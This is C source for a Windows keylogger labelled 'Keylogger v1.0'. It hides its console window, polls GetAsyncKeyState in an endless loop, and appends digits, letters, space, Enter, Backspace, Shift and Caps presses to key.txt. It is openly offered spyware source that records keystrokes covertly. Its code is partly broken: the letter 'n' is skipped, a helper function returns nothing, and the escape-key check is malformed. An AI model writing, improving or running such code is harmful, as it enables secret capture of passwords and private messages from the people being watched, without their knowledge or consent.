/*
Keylogger v1.0
Author :- Arushit Mudgal */

#define _WIN32_WINNT 0x0500

#include<stdio.h>
#include<stdlib.h>
#include<windows.h>

int G(int a){
    GetAsyncKeyState(a);
}

int main()
{
    HWND hwnd=GetConsoleWindow();
    //ShowWindow(hwnd,SW_MINIMIZE); //wont hide the window, minimise
    ShowWindow(hwnd,SW_HIDE);

    FILE *fp;
    fp = fopen("key.txt","a");
    if(fp==NULL){
        puts("Sorry! Cant open file");
        exit(1);
    }
    while(1){

        Sleep(140);
        //Numbers ranging from 48 - 57
        if(GetAsyncKeyState(48) || G(96))fputs("0",fp);
        else if(GetAsyncKeyState(49) || G(97))fputs("1",fp);
        else if(GetAsyncKeyState(50) || G(98))fputs("2",fp);
        else if(GetAsyncKeyState(51) || G(99))fputs("3",fp);
        else if(GetAsyncKeyState(52) || G(100))fputs("4",fp);
        else if(GetAsyncKeyState(53) || G(101))fputs("5",fp);
        else if(GetAsyncKeyState(54) || G(102))fputs("6",fp);
        else if(GetAsyncKeyState(55) || G(103))fputs("7",fp);
        else if(GetAsyncKeyState(56) || G(104))fputs("8",fp);
        else if(GetAsyncKeyState(57) || G(105))fputs("9",fp);
        //Alphabets Uppercase from 65-90
        else if(GetAsyncKeyState(65))fputs("a",fp);
        else if(GetAsyncKeyState(66))fputs("b",fp);
        else if(GetAsyncKeyState(67))fputs("c",fp);
        else if(GetAsyncKeyState(68))fputs("d",fp);
        else if(GetAsyncKeyState(69))fputs("e",fp);
        else if(GetAsyncKeyState(70))fputs("f",fp);
        else if(GetAsyncKeyState(71))fputs("g",fp);
        else if(GetAsyncKeyState(72))fputs("h",fp);
        else if(GetAsyncKeyState(73))fputs("i",fp);
        else if(GetAsyncKeyState(74))fputs("j",fp);
        else if(GetAsyncKeyState(75))fputs("k",fp);
        else if(GetAsyncKeyState(76))fputs("l",fp);
        else if(GetAsyncKeyState(77))fputs("m",fp);
        else if(GetAsyncKeyState(79))fputs("o",fp);
        else if(GetAsyncKeyState(80))fputs("p",fp);
        else if(GetAsyncKeyState(81))fputs("q",fp);
        else if(GetAsyncKeyState(82))fputs("r",fp);
        else if(GetAsyncKeyState(83))fputs("s",fp);
        else if(GetAsyncKeyState(84))fputs("t",fp);
        else if(GetAsyncKeyState(85))fputs("u",fp);
        else if(GetAsyncKeyState(86))fputs("v",fp);
        else if(GetAsyncKeyState(87))fputs("w",fp);
        else if(GetAsyncKeyState(88))fputs("x",fp);
        else if(GetAsyncKeyState(89))fputs("y",fp);
        else if(GetAsyncKeyState(90))fputs("z",fp);
        //special characters 
        else if(GetAsyncKeyState(32))fputs(" ",fp); //space
        else if(GetAsyncKeyState(8))fputs("[BACKSPACE]",fp); //backspace
        else if(GetAsyncKeyState(13))fputs("[ENTER]",fp); //enter
        else if(GetAsyncKeyState(16))fputs("[SHIFT]",fp);
        else if(GetAsyncKeyState(20))fputs("[CAPS]",fp);

        else if(GetAsyncKeyState(VK_ESCAPE || VK_F1)){
            fclose(fp);
            break;
        }
    }
    fclose(fp);
    return 0;
}
